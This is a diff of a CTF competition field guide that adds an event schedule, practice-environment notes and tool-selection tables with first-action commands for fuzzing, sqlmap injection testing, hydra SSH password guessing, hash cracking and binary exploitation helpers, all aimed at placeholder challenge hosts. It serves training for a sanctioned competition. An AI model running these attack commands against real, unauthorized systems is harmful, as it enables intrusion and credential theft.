+Flags **typically** use `CSG_FLAG{example_flag}`. Submit the entire value, including prefix/braces, through CTFd; follow a challenge's explicit format if it differs. `CTF{...}` and short plaintexts in old examples are synthetic teaching results, not instructions to change the competition flag format. [PDF p.20](sources/practice-environment.pdf#page=20).
+
+| Competition slot | What to prepare |
+| --- | --- |
+| 26 October: technical preparation 08:00–09:00; environment briefing 09:30–09:50 | Check the current access instructions, guide files and key tool launches |
+| 26 October: Question Set 1, **10:00–17:00** | Solve and retain brief command/evidence notes |
+| 27 October: Question Set 2, **09:00–13:00** | Different set from Day 1; reassess priorities |
+| 27 October: **13:00–15:30 write-up and team presentations** | Preserve derivations and accepted verdicts while solving |
+
+Times are copied from [PDF p.11](sources/practice-environment.pdf#page=11); use the venue's day-of briefing for changes. Official communication channels are supplied on the day. Organizers monitor screens and participant activity ([pp.8–10](sources/practice-environment.pdf#page=8)). No scoring details or presentation format beyond the PDF are assumed.
+
+<a id="competition--practice-session-reference-only"></a>
+
+## Practice-session reference only
+
+**Practice was 19–23 October 2026**, using your own computer; competition is 26–27 October on organizer laptops. The following comes from pages 12–20 and is not an instruction to spend another launch now. It does not establish a three-launch quota for competition day.
+
+- The practice CTFd URL is `https://2026ctf.ajccbc-cyber-sea-game.net`. Each team receives four accounts, one per participant. Use the competition URL/account allocation supplied on the day. [pp.13–14](sources/practice-environment.pdf#page=14)
+- Practice Gmail uses the same ID/password as CTFd, with the `@trend.training` domain on Google's normal Gmail sign-in. The invitation lasts 14 days. Find the Platform Experience invitation and complete onboarding. [pp.15–16](sources/practice-environment.pdf#page=15)
+- Starting practice deployment takes **about 20 minutes**. Leave it alone while deploying. **Up to 3 launches per account; Terminate consumes the current session.** Repeated starts/terminations are not a troubleshooting loop. [p.17](sources/practice-environment.pdf#page=17)
+- The practice **Misc → Welcome** challenge directs you to find `flag.txt` in your Kali user profile. After connecting, `find "$HOME" -maxdepth 2 -type f -name flag.txt` lists likely locations; use `cat` on the returned path. This is a practice task, not a promised competition flag location. [p.19](sources/practice-environment.pdf#page=19)
+
+Keep the short [quick reference](#quickstart) open during solving. Use this setup page when the problem is access, environment, permission or workflow rather than the challenge itself.
+
+
+---
+
+<a id="tool-chooser"></a>
+
+<a id="tool-chooser--choose-a-tool-by-the-job"></a>
+
+# Choose a tool by the job
+
+Start with the **first choice** for your category. The tables compare useful approved options; the [complete matrix](#tool-matrix) retains all 282 workbook entries, including exclusions. A program appearing on Kali's website does not establish event approval: the environment below comes from your workbook.
+
+**Location key:** Windows = native Windows; WSL = Linux inside Windows; Kali = the separate supplied Kali machine. **W29** means `Approved Tool List for Windows!C29`; **K123** means `Approved Tool List for Kali!C123`. Blank installation notes still require a local availability check. Tool names link to documentation where useful; these links are optional and are not needed to read this guide offline.
+
+Examples use files in the current directory. Replace `challenge.example`, filenames and uppercase placeholders with the challenge's values. `words.txt` is a small list you prepared from the clues. GUI rows give an actual click path. Bash commands belong in the row's Linux environment.
+
+<a id="tool-chooser--web"></a>
+
+## Web
+
+**First choice:** inspect one request with Burp Repeater or curl. For hidden paths, choose ffuf for flexible filtering or Gobuster for a straightforward directory scan.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [Burp Community](https://portswigger.net/burp/documentation/desktop/tools/repeater) · WSL · W27 | Editing one captured request and comparing responses | Community is a manual workflow; do not assume Pro scanning or unapproved extensions | HTTP history → right-click request → Send to Repeater → edit one field → Send |
+| [curl](https://curl.se/docs/manpage.html) · Kali · K30 | Reproducible HTTP requests, headers and cookies | Does not execute browser JavaScript; use Chrome for client behavior | `curl -i 'http://challenge.example/'` |
+| [ffuf](https://github.com/ffuf/ffuf) · Kali · K48 | Fuzzing paths, parameters, headers and bodies; filtering responses | Needs a meaningful wordlist and baseline; automatic filters can hide hits | `ffuf -u 'http://challenge.example/FUZZ' -w words.txt -ac -rate 20 -maxtime 60` |
+| [Gobuster](https://github.com/OJ/gobuster) · Kali · K61 | Directory/file, DNS and virtual-host discovery | Wildcard responses produce false hits; less convenient for complex request mutations | `gobuster dir -u 'http://challenge.example/' -w words.txt -t 5` |
+| [Feroxbuster](https://www.kali.org/tools/feroxbuster/) · Kali · K46 | Recursively finding content beneath discovered directories | Recursion expands the scan quickly; cap depth and request rate | `feroxbuster -u 'http://challenge.example/' -w words.txt --depth 1 --rate-limit 10` |
+| [sqlmap](https://www.kali.org/tools/sqlmap/) · Kali · K139 | Testing a suspected SQL injection with the original request | Does not solve access-control or business-logic bugs; stale cookies/CSRF tokens break tests | Save request as `request.txt`; `sqlmap -r request.txt -p id --batch --level=1 --risk=1` (replace `id`) |
+| Google Chrome · Windows · W12 | Browser-only behavior, storage and JavaScript requests | DevTools showing a value is not proof the server trusts it | F12 → Network → reload → select request → Headers / Response |
+
+**These are different jobs:** ffuf/Gobuster discover or vary web inputs. They are not offline password-hash crackers. ffuf can send login guesses, but correctly detecting login success, tokens and rate limits needs a separate workflow. Use the next table to choose deliberately.
+
+<a id="tool-chooser--passwords-and-hashes"></a>
+
+## Passwords and hashes
+
+**First choice:** John for an offline hash/file format you can identify; hashcat when the mode and a working compute backend are known. Hydra is for attempts against a live login service, not a hash file.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [John the Ripper jumbo](https://www.openwall.com/john/doc/EXAMPLES.shtml) · Kali · K80 | Many hash formats, rules and archive-to-hash workflows | Format detection can be ambiguous; guessing the wrong format wastes time | For known raw MD5: `john --format=raw-md5 --wordlist=words.txt hashes.txt`; then `john --show --format=raw-md5 hashes.txt` |
+| [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) · Kali · K66 | Fast offline candidate testing with suitable hardware; masks and rules | Requires the right hash mode and usable backend; Supplied t3.large Kali has 2 vCPU and no GPU; verify backend support | `hashcat -I`; for raw MD5: `hashcat -m 0 -a 0 hashes.txt words.txt`; then `hashcat -m 0 hashes.txt --show` |
+| [Hydra](https://github.com/vanhauser-thc/thc-hydra) · Kali · K72 | Online username/password testing across supported protocols | Network latency, lockouts, CSRF and misleading success markers; cannot crack offline hashes | For a challenge-authorized SSH login: `hydra -l USER -P words.txt -t 1 -f ssh://challenge.example` |
+| [hashid](https://www.kali.org/tools/hashid/) · Kali · K67 | Suggesting formats from hash shape | A 32-hex-character value could be MD5, NTLM or another format; shape is not identification | `hashid hashes.txt`; confirm from source or hash prefix before choosing a cracker |
+| John jumbo archive extractors · Kali · K80 | Converting protected archives into crackable records | Extraction is format-specific; not every encryption variant is supported | `zip2john locked.zip > zip.hash`; then `john --wordlist=words.txt zip.hash`; inspect with `john --show zip.hash` |
+| [bkcrack](https://github.com/kimci86/bkcrack) · Kali · K20 | Known-plaintext attacks on legacy ZipCrypto | Not a general ZIP AES cracker; requires suitable known plaintext bytes | `bkcrack -L locked.zip` to inspect encryption/members, then follow the [archive chapter](#03-forensics) |
+| rockyou.txt / SecLists · Kali · K127, K133 | Candidate passwords / task-specific discovery lists | Lists are data, not cracking tools; a huge wrong list is slower than a small relevant one | `ls /usr/share/wordlists/rockyou.txt`; `find /usr/share /usr/bin/seclists -iname '*common*.txt' 2>/dev/null` |
+
+After recovering a password, verify it with the challenge file or login. A “no hashes loaded” error means parsing/format needs attention; an exhausted list means those candidates did not match. Neither proves that the password is uncrackable.
+
+<a id="tool-chooser--forensics"></a>
+
+## Forensics
+
+**First choice:** choose the artifact: disk → Sleuth Kit/Autopsy; memory → Volatility; Windows logs → named fields and timeline.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [The Sleuth Kit](https://www.sleuthkit.org/sleuthkit/man/fls.html) · WSL · W30 | File systems, deleted entries and extraction without mounting | Needs the correct partition offset; carving is a separate task | `mmls disk.img`; then `fls -r -o START_SECTOR disk.img` using the reported start sector |
+| [Autopsy](https://sleuthkit.org/autopsy/docs/user-docs/4.22.0/) · Windows · W41 | Browsing a disk image and correlating many artifacts in a GUI | Ingest/indexing can take time; a single known file may be faster with Sleuth Kit | New Case → Add Data Source → Disk Image → choose relevant ingest modules |
+| [Volatility 3](https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html) · WSL · W38 | Processes, command lines and other structures in memory dumps | Requires matching symbols/layers; cannot create missing memory evidence | If installed entry point is `vol`: `vol -f memory.raw windows.info`; then `vol -f memory.raw windows.pslist` |
+| [Eric Zimmerman's Tools](https://github.com/EricZimmerman/evtx) · Windows · W46 | Windows artifact parsers producing useful CSV timelines | Suite contains many executables; field meaning and timezone still need interpretation | From its installed folder: `.\EvtxECmd.exe -f .\Security.evtx --csv .\out` |
+| [7-Zip](https://www.kali.org/tools/7zip/) · Kali · K9 | Listing/testing many archive formats before extraction | Ordinary extraction can overwrite duplicate names; encrypted content needs a password | `7z l evidence.zip`; `7z t evidence.zip` |
+| [sqlite3](https://sqlite.org/cli.html) · Kali · K138 | Fast inspection of browser/app databases | Deleted rows and WAL recovery require more than a normal query | `sqlite3 -readonly evidence.db '.tables'`; then `sqlite3 -readonly evidence.db '.schema'` |
+| [ExifTool](https://www.kali.org/tools/libimage-exiftool-perl/) · WSL · W21 | Metadata across images, media and documents | Metadata can be absent, altered or misleading | `exiftool -a -G1 -s evidence.jpg` |
+
+Do not confuse Volatility 3 in WSL with the Kali Volatility 2 rows. A parser's output is evidence to interpret, not an automatic conclusion. [Process-event quick card](#quickstart--process-event).
+
+<a id="tool-chooser--network"></a>
+
+## Network
+
+**First choice:** Wireshark for understanding one conversation; TShark/Zeek for repeatable summaries. Nmap is active service discovery, not analysis of a PCAP.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [Wireshark](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html) · Windows · W9 | Interactive packet dissection, streams and object export | TLS application data stays encrypted without suitable secrets | [Conversation/filter/stream click path](#quickstart--network-conversation) |
+| [TShark](https://www.wireshark.org/docs/man-pages/tshark.html) · Windows · W43 | Terminal filters, field export and repeatable summaries | Display/capture filters have different syntax; Windows executable path may need quoting | PowerShell: `& 'C:\Program Files\Wireshark\tshark.exe' -r .\capture.pcapng -q -z conv,tcp` |
+| [Zeek](https://docs.zeek.org/en/current/quickstart.html) · WSL · W25 | Turning a capture into connection, DNS and HTTP logs | Summaries omit some packet-level detail; encrypted content is still hidden | In a fresh output folder: `zeek -r ../capture.pcapng`; inspect `conn.log` |
+| [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html) · Kali · K149 | Small terminal packet views with capture-filter syntax | Limited application reconstruction compared with Wireshark | `tcpdump -nn -r capture.pcapng -c 30` |
+| [Nmap](https://nmap.org/book/man.html) · Kali · K101 | Identifying open ports and service versions on designated targets | Service banners are hints; scans do not establish exploitability | `nmap -sT -sV -p 80,443,8080 challenge.example` |
+| can-utils · WSL · W23 | Reading CAN bus frames and supplied automotive traces | Requires CAN-specific interpretation; it is not an Ethernet decoder | For a prepared challenge CAN interface: `candump -L can0`; for a supplied text log, inspect it without transmitting |
+
+<a id="tool-chooser--steganography-and-audio"></a>
+
+## Steganography and audio
+
+**First choice:** metadata and file structure before password guessing. PNG/BMP bit planes → zsteg; suspected steghide carrier → steghide/stegseek; sound/image-like tones → spectrogram.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [zsteg](https://github.com/zed-0xff/zsteg) · WSL · W19 | Common PNG/BMP bit-plane patterns | Random channels produce plausible text; does not analyze JPEG compression stego | `zsteg -a carrier.png`; validate a promising extraction before accepting it |
+| [binwalk](https://www.kali.org/tools/binwalk/) · WSL · W20 | Finding embedded signatures/offsets | Signatures can be false positives; extraction helpers vary by version | `binwalk carrier.bin`; inspect a candidate offset before extracting |
+| [pngcheck](https://www.kali.org/tools/pngcheck/) · Kali · K115 | PNG structure, CRC and chunk errors | Does not reveal arbitrary hidden pixel payloads | `pngcheck -v carrier.png` |
+| [steghide](https://www.kali.org/tools/steghide/) · Kali · K141 | Extracting its own JPEG/BMP/WAV/AU carriers with a passphrase | Not a general PNG/LSB tool; wrong carrier family will not work | `steghide info carrier.jpg`; `steghide extract -sf carrier.jpg` (enter supplied passphrase) |
+| [stegseek](https://github.com/RickdeJager/stegseek) · Kali · K142 | Fast steghide password guessing with a wordlist | Does not crack every steganography method; list must contain a useful candidate | `stegseek carrier.jpg words.txt recovered.bin` |
+| [Audacity](https://manual.audacityteam.org/man/spectrogram_view.html) · Kali · K17 | Listening, channel inspection and spectrograms | A spectrogram is a visual clue, not an automatic modem decoder | Open audio → track menu → Spectrogram; zoom the suspicious time range |
+| [FFmpeg](https://ffmpeg.org/ffmpeg.html) · Kali · K47 | Converting media and selecting audio/video streams | Lossy conversion can destroy evidence; preserve the original | `ffmpeg -i input.wav -c:a pcm_s16le working.wav` |
+| ZBar · WSL · W26 | Local barcode/QR decoding | Damaged or stylized codes may need image repair | `zbarimg --raw code.png` |
+
+No trailer found? Try metadata or a relevant bit-plane technique, not every stego tool. [PNG trailer card](#quickstart--png-trailer).
+
+<a id="tool-chooser--reverse-engineering"></a>
+
+## Reverse engineering
+
+**First choice:** Ghidra for readable native-code structure; radare2 for terminal inspection; choose a format-specific decompiler for .NET or Android.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [Ghidra](https://ghidra.re/ghidra_docs/GhidraClass/Beginner/Introduction_to_Ghidra_Student_Guide.html) · WSL · W29 | Native decompilation, cross-references and data flow | Decompiler output can misrepresent types; verify critical operations in disassembly | Import → Analyze → Search for Strings → references to success/failure text |
+| [radare2](https://book.rada.re/refcard/intro.html) · Kali · K123 | Terminal disassembly, strings and scripting | Dense command language; automatic function discovery can be wrong | `r2 -A challenge.bin`; inside: `iz`, `afl`, `pdf @ main` |
+| objdump · WSL · W17 | Quick headers and disassembly without a project | No high-level decompiler; architecture/flavor flags matter | `objdump -f challenge.bin`; for x86: `objdump -d -M intel challenge.bin` |
+| strings · WSL · W18 | Quick hints: error strings, URLs and paths | Misses decoded/encrypted runtime strings; strings are not proof of behavior | `strings -a -n 6 challenge.bin` |
+| [GDB](https://sourceware.org/gdb/current/onlinedocs/gdb/) · WSL · W16 | Register/memory inspection and breakpoints on compatible targets | Running a target changes state; wrong architecture/OS may not run | `gdb -nx ./challenge`; inside: `break main`, `run`, `info registers` |
+| x64dbg · Windows · W40 | Debugging native Windows executables with a GUI | Not a .NET source decompiler; executing malware needs an isolated lab | File → Open → challenge EXE → set a breakpoint at the identified comparison → Run |
+| [dnSpyEx](https://github.com/dnSpyEx/dnSpy) · Windows · W45 | Browsing/decompiling .NET assemblies | Obfuscation/native components need other techniques | File → Open assembly → expand types → find entry point and comparison method |
+| [jadx](https://www.kali.org/tools/jadx/) · Kali · K79 | Android DEX/APK decompilation and searching usages | Recovered Java may be incomplete; native `.so` logic needs native reversing | `jadx-gui challenge.apk`; search the success string and its usages |
+
+Already extracted the checker constants? Use the [complete XOR/rotation card](#quickstart--xor-and-rotation) or [small-VM card](#quickstart--small-vm).
+
+<a id="tool-chooser--cryptography"></a>
+
+## Cryptography
+
+**First choice:** identify the math/format from source. Encoding, password hashes and public-key encryption are different problems.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| Python 3 standard library · WSL · W14 | Exact integers, modular arithmetic and custom transformations | Does not automatically identify attacks or factor a strong RSA modulus | `python3 recipes/rsa.py rsa.json` for the [documented raw-RSA case](#quickstart--rsa) |
+| [OpenSSL](https://docs.openssl.org/3.0/man1/openssl-pkey/) · WSL · W31 | Inspecting standard keys/certificates and known cipher formats | Wrong mode/padding/KDF produces nonsense; it is not a generic crypto solver | `openssl pkey -pubin -in public.pem -text -noout` |
+| [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) · WSL · W37 | Trying known weak-RSA structures against supplied keys | Fermat needs close primes; remote-backed attacks can violate event restrictions | `RsaCtfTool --publickey public.pem --attack fermat --private`; if unavailable, use the [bounded Python recipe](#quickstart--rsa) with n/e/c |
+| [SageMath](https://doc.sagemath.org/html/en/tutorial/) · Kali · K132 | Algebra, finite fields, polynomial and lattice calculations | Startup/dependencies and mathematical modeling can dominate solve time | `sage -c 'print(factor(3233))'` is a small availability check, not proof large moduli are factorable |
+| [PARI/GP](https://pari.math.u-bordeaux.fr/gp.html) · Kali · K109 | Number theory and exact arithmetic at a prompt | GP syntax differs from Python/Sage; does not choose the cryptographic weakness | Run `gp`; enter `factor(3233)` |
+| CyberChef · Windows browser bookmark · W8 | Seeing byte encodings and chaining simple transforms visually | Bookmark does not establish offline availability; optional operations/services may send data | In the organizer-approved local/client-side instance: From Base64 → inspect output; use the [local decoder](#quickstart--decode-layers) if availability/data handling is unclear |
+
+For advanced crypto, start with the [advanced chapter](#14-advanced-crypto) only after identifying the required mathematical relation. The approved `crypto-attacks` checkout (K29) is reference code requiring assumptions/dependencies, not a universal `solve` command. No FactorDB upload is implied by local package approval.
+
+<a id="tool-chooser--binary-exploitation"></a>
+
+## Binary exploitation
+
+**First choice:** establish the bug and mitigations, then use a debugger. A gadget list or mitigation report is not an exploit.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [checksec](https://github.com/slimm609/checksec) · Kali · K28 | Summarizing ELF mitigations | Syntax differs across releases; flags describe defenses, not a vulnerability | Try `checksec --file=challenge`; if help shows subcommands, use `checksec file ./challenge` |
+| GDB · WSL · W16 | Inspecting the crash and verifying overwrite effects | Local addresses differ with ASLR/PIE; debugger state can differ from remote | `gdb -nx ./challenge`; inside: `run < pattern.bin`, then `info registers` |
+| pwndbg / GEF · Kali · K116, K55 | Rich debugger context, heap views and exploitation helpers | Plugin compatibility varies; don't load competing extensions together | **GEF route:** in an existing Kali GDB, `source /opt/tools/gef.py`. **pwndbg:** use its already configured debugger; otherwise use WSL plain GDB |
+| [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) · Kali · K128 | Finding instruction sequences in a binary/library | A listed gadget may have side effects or a relocated address | `ROPgadget --binary challenge --only 'pop\|ret'` |
+| Ncat (Nmap suite) · Kali · K101 | Manually interacting with a challenge TCP service | Text terminals can alter binary input; protocol framing still matters | `ncat challenge.example 31337` |
+| [strace](https://strace.io/) · Kali · K145 | Seeing Linux syscalls, file opens and denied operations | Does not show every internal function or Windows API call; executes the target | `strace -f -o trace.txt ./challenge` |
+
+The [crash-offset card](#quickstart--crash-offset) provides an exact pattern generator. Historical pwn examples remain in the practice atlas; allocator/version assumptions must match your target.
+
+<a id="tool-chooser--malware"></a>
+
+## Malware
+
+**First choice:** static strings, file structure and scripts. Only execute samples in the supplied isolated analysis environment when the task calls for it.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| [FLOSS](https://github.com/mandiant/flare-floss) · Kali · K50 | Recovering some obfuscated/stack strings from executables | Heuristics miss unsupported code; recovered strings do not prove execution | `floss suspect.exe` |
+| [capa](https://github.com/mandiant/capa) · Kali · K26 | Suggesting capabilities from static patterns | Rule matches need supporting code; packing can hide behavior | `capa suspect.exe` |
+| [oletools](https://www.kali.org/tools/oletools/) · Kali · K105 | Inspecting Office macros and embedded objects | Not every document exploit is a macro; never enable macros just to inspect them | `oleid suspect.docm`; `olevba suspect.docm` |
+| [YARA](https://www.kali.org/tools/yara/) · Kali · K164 | Finding files matching supplied/custom byte rules | Match quality depends on rules; no match does not mean benign | `yara -r rules.yar samples/` |
+| [UPX](https://upx.github.io/) · Kali · K156 | Recognizing/unpacking supported UPX-packed executables | Modified packers may fail; not a universal unpacker | `upx -t suspect.exe`; if confirmed, unpack a copy: `upx -d -o unpacked.exe suspect.exe` |
+| Ghidra / x64dbg · WSL W29 / Windows W40 | Following decoded logic / observing runtime behavior | Static analysis can miss runtime state; debugging executes the sample | Use the [reverse table](#tool-chooser--reverse-engineering) for the matching native format |
+
+<a id="tool-chooser--osint"></a>
+
+## OSINT
+
+**First choice:** extract clues from the supplied material, then corroborate. Public analysis upload services remain excluded; a browser is not blanket permission for every service.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| ExifTool · WSL · W21 | Metadata/GPS/timezone clues in supplied media | Values can be edited or stripped; corroborate independently | `exiftool -a -G1 -s clue.jpg` |
+| Google Chrome · Windows · W12 | Reading permitted public sources and comparing visible details | Search results are leads, not evidence; do not upload challenge files | Search a distinctive quoted phrase; open the original page and record URL/date |
+| [ripgrep](https://github.com/BurntSushi/ripgrep) · Kali · K126 | Searching supplied websites, exports and source folders locally | Binary or compressed content must be decoded first | `rg -n -i 'distinctive phrase' supplied/` |
+| pdftotext · WSL · W22 | Extracting searchable text from a supplied PDF | Scanned images may contain no text layer | `pdftotext -layout clue.pdf clue.txt`; inspect `clue.txt` |
+| [Git](https://git-scm.com/docs/git-log) · Kali · K56 | Investigating history in a supplied repository | A shallow/exported copy may lack history; don't contact unrelated remotes | `git -C supplied log --all --oneline`; `git -C supplied show COMMIT` |
+
+<a id="tool-chooser--miscellaneous"></a>
+
+## Miscellaneous
+
+**First choice:** identify the representation before choosing a tool. Reuse the steganography/audio and password tables when those fit the clue.
+
+| Tool / event environment | Strong at | Weakness / when to switch | First action |
+| --- | --- | --- | --- |
+| Python 3 · WSL · W14 | Small parsers, encodings, arithmetic and exact byte transformations | Requires correct input assumptions; generic brute force grows quickly | For Base64/compression: `python3 recipes/layers.py message.txt --out decoded` |
+| [jq](https://jqlang.org/manual/) · WSL · W28 | Inspecting/filtering JSON without writing a parser | JSON only; malformed text or binary formats need another route | `jq . challenge.json`; once fields are known: `jq '.key' challenge.json` |
+| xxd · WSL · W35 | Inspecting byte offsets and converting plain hex | Hex views do not identify the hidden format by themselves | `xxd -l 128 challenge.bin`; for plain hex: `xxd -r -p hex.txt > decoded.bin` |
+| HxD · Windows · W42 | Visual byte/offset inspection and careful edits to a copy | Easy to corrupt offsets with edits; no semantic decoder | File → Open → Search → Find (hex-values tab); keep the original unchanged |
+| [file](https://www.darwinsys.com/file/) · Kali · K49 | Initial type/magic identification | Extensions/magic can be forged; embedded files need further inspection | `file challenge.bin` |
+| [7-Zip](https://www.kali.org/tools/7zip/) · Kali · K9 | Recognizing/listing unfamiliar containers | A listed member may be encrypted; duplicate names need preservation | `7z l challenge.bin`; for tar duplicates use [the preserving extractor](#quickstart--duplicate-tar-files) |
+
+AI/ML tools and agent workflows are excluded by the event rules, so there is no recommended AI-tool table. [Exclusions and alternatives](#12-excluded-and-advanced).
+
+<a id="tool-chooser--if-a-tool-fails-to-start"></a>
+
+## If a tool fails to start
+
+Check the environment first, then its recorded path in the [full matrix](#tool-matrix). A missing `r2` in WSL is expected from this list: use Kali or WSL Ghidra. A missing GPU backend makes hashcat a poor first choice; try the supported John format. Use [targeted non-AI package setup](#00-tool-rules--non-ai-python-package-checks) only when needed. Unlisted standalone apps require approval; [machine limits](#competition--choose-the-machine-before-the-tool) favor short candidate lists and one heavy Kali job at a time.
+
+
+---
+
 <a id="00-start-here"></a>
 
+<a id="00-start-here--start-here-the-human-solvers-field-guide"></a>
+
 # Start here: the human solver's field guide
+
+**Quick route:** [Short commands](#quickstart--web-paths) · [Tool strengths and weaknesses](#tool-chooser--web). Use this chapter for deeper explanations.
 
 This is a practical companion to the CTF skills repository: find the symptom you have, run a small test, interpret the result, and choose the next step. You do not need to know the vulnerability name before opening a chapter.
 
 **Built for both Windows/WSL and Kali.** Commands tagged `bash` belong in a Linux terminal, including WSL. Commands tagged `powershell` belong in Windows PowerShell. A `python` block is a script: save it under the filename given, then run it using the Python interpreter in that environment. Never paste a multiline Bash command straight into PowerShell.
 
+<a id="00-start-here--what-to-read-tonight"></a>
+
 ## What to read tonight
 
-1. Read **Tools and competition rules** and check the tools you expect to use.
-2. Work through **First ten minutes** with one small local file.
-3. Choose two of the six main subjects: web, forensics, network, steganography, reverse engineering, and cryptography. Read their opening workflows, then try a concrete recipe.
-4. Keep the **tool matrix** handy when a familiar program is missing. Approved does not mean installed correctly.
-5. Use the supplementary pwn, malware, OSINT, miscellaneous, and advanced sections when the evidence calls for them.
+1. Open the [quick reference](#quickstart) for the task in front of you.
+2. Read [Competition setup](#competition) once for VPN access, machine limits and rules.
+3. If a task needs more depth, open its category chapter. The seven listed categories are Digital Forensics, Malware Analysis, Web Security, Reverse Engineering, OSINT, Cryptography and Miscellaneous.
+4. Use the [tool chooser](#tool-chooser) when a program is missing. Network, steganography, pwn and advanced chapters are supporting references.
 
-The official 2026 event page identifies AJCCBC and Trend Micro, lists the six main categories, and gives 26–27 October in Bangkok. This guide prioritizes those subjects; the vendor's identity does not reveal tomorrow's challenges. [Official event page, checked 25 October 2026](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/).
+The supplied TrendAI environment PDF is the operational source for this edition's category order and 26–27 October schedule. AJCCBC and the vendor's identity do not reveal the challenges. [Categories and event times](#competition--categories-flags-and-time).
+
+<a id="00-start-here--find-your-starting-point"></a>
 
 ## Find your starting point
 
@@ -60,6 +803,8 @@ The official 2026 event page identifies AJCCBC and Trend Micro, lists the six ma
 
 Categories overlap. Recover a file from a packet capture, identify its format, then switch to the appropriate chapter. A remote port alone does not make a challenge pwn.
 
+<a id="00-start-here--how-each-recipe-works"></a>
+
 ## How each recipe works
 
 **Recognize:** the clues that justify trying it. **Run:** a command or complete small script. **Read the result:** what success, failure, and misleading output look like. **Next:** the cheapest evidence-backed follow-up.
@@ -68,6 +813,8 @@ Examples use names such as `challenge.bin`, `capture.pcapng`, and `image.png`. R
 
 Commands are recipes, not a script to run top to bottom against every challenge. Read the surrounding paragraph before copying a block. Some blocks contain several alternatives; choose the one that matches your evidence.
 
+<a id="00-start-here--read-this-guide-in-either-format"></a>
+
 ## Read this guide in either format
 
 - **Website:** open `index.html` in Chrome. It embeds all content, styles, and search data. It makes no network requests. Search accepts several words, such as `RSA shared prime` or `Windows event log`. Press `/` to focus search and Escape to return to the chapter.
@@ -75,7 +822,9 @@ Commands are recipes, not a script to run top to bottom against every challenge.
 - **Print:** the website's print button prints the current chapter. Search results can also be printed. Code blocks wrap in print but preserve their original text when copied.
 - **Tool matrix:** look up the exact program name and its environment. The workbook is the authority for the supplied list, not a package's popularity.
 
-The guide is prepared study material. The supplied list does not establish whether bringing this handbook, prepared scripts, or removable media is permitted. Check that specific point with the organizers before using it during the event. No AI service is needed to read it.
+The PDF permits this handbook and scripts prepared before the competition. Use the [rules summary](#competition--what-is-allowed) for reference access, team collaboration and excluded services.
+
+<a id="00-start-here--useful-vocabulary"></a>
 
 ## Useful vocabulary
 
@@ -92,6 +841,8 @@ The guide is prepared study material. The supplied list does not establish wheth
 | False positive | An output that resembles your answer without enough evidence to support it. |
 | Pivot | Changing approach because a result points somewhere else. |
 
+<a id="00-start-here--what-this-edition-preserves"></a>
+
 ## What this edition preserves
 
 The original repository remains available alongside this folder. Repeated agent instructions have been consolidated into human workflows. Advanced and historical material has its own sections, with prerequisites rather than promises that old exploits work on new systems. The source coverage appendix records where each original file went and what was excluded. Original examples are not all validated exploits; this edition is also not a guarantee that an organizer's installation will run every command unchanged.
@@ -101,9 +852,13 @@ The original repository remains available alongside this folder. Repeated agent 
 
 <a id="00-tool-rules"></a>
 
+<a id="00-tool-rules--tools-and-competition-rules"></a>
+
 # Tools and competition rules
 
-The supplied workbook is `AJCCBC_CTF2026_Tool_Review_List_261015r11.xlsx`. All three sheets were inspected, including their introductory notes and installation remarks. There are **39 Windows/WSL entries, 161 Kali entries, and 82 unapproved entries**. These are row counts, not counts of unique executable names.
+Use the [competition setup page](#competition) for the PDF's rules, VPN access and machine limits. This page covers the supplied workbook, `AJCCBC_CTF2026_Tool_Review_List_261015r11.xlsx`: **39 Windows/WSL entries, 161 Kali entries, and 82 unapproved entries**, including all installation remarks. Counts refer to rows, not unique executable names.
+
+<a id="00-tool-rules--read-approval-and-availability-separately"></a>
 
 ## Read approval and availability separately
 
@@ -113,22 +868,26 @@ The supplied workbook is `AJCCBC_CTF2026_Tool_Review_List_261015r11.xlsx`. All t
 | Approved · WSL | Listed on the Windows sheet, but installed in WSL. | Enter the existing WSL environment first. |
 | Approved · Kali | Listed on the Kali sheet for the supplied AWS environment. | Use that environment and check the recorded location. |
 | Approved · availability uncertain | Listed, but version/path is missing or startup failed. | Check availability early; keep the documented alternative ready. |
-| Unapproved | Appears on the unapproved sheet, even when the reason is installation trouble. | Use the approved alternative. Do not reinstall it by another route. |
-| Not listed | No explicit entry was found. | Do not assume approval just because it is common in CTFs. |
+| Unapproved | Appears on the unapproved sheet; reasons include installation failure and explicit prohibition. | Use the listed alternative. The PDF does not expressly clear these named entries; resolve a needed exception through official support. |
+| Not listed | No explicit entry was found. | Unlisted standalone apps need organizer approval. Non-AI libraries/dependencies/plugins/packages follow PDF p.5. |
 
-The sheet titled “Unapproved List” says its entries could not be installed; individual reasons distinguish unsupported, unnecessary, licensing, and explicitly prohibited tools. Preserve that distinction. An installation failure is not the same explanation as a rule prohibition, but neither gives you approval to use the tool.
+The guide conservatively keeps named unapproved entries out of its practical routes. An installation failure and a rule prohibition are different reasons; the matrix preserves the original wording.
 
-Routine shell syntax and basic filesystem commands are used as operating-system facilities. They are not individually certified by this guide. Approval of a host application does not establish approval for every extension or online service it can access.
+Routine shell syntax and basic filesystem commands are operating-system facilities. For additions, follow [PDF p.5 and the workbook reconciliation](#competition--what-is-allowed); a permitted plugin is not necessarily installed, and a local tool listing does not authorize an online service.
+
+<a id="00-tool-rules--the-important-restrictions"></a>
 
 ## The important restrictions
 
